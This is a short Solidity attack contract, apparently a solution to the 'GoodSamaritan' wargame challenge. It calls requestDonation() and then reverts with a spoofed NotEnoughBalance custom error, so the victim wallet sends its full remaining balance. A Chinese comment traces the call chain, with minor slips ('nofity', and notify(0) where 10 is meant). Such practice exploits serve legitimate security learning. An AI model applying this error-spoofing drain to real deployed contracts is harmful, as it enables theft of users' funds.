// SPDX-License-Identifier: MIT
pragma solidity >0.8.4;
contract INotifyable{
    address public target;
    error NotEnoughBalance();
    constructor(address add){
        target=add;
    }
    function notify(uint256 amount)public {
        if (amount == 0){
            // 1st call
            bytes memory data = abi.encodeWithSignature("requestDonation()");
            target.call(data);
        }else if (amount == 10){
            //2nd call
            revert NotEnoughBalance();
        }
    }
}

/* 漏洞原理
EOA -> coin.transfer(evilContract,0)
        -> evilContract.notify(0)
            -> GoodSamaritan.requestDonation()
            -> wallet.donate10(evilContract)
            -> coin.transfer(evilContract,10)
                -> evilContract.nofity(0)
                    -> revert notEnoughBalance();
            <- wallet.transferRemainder(evilContract)
 */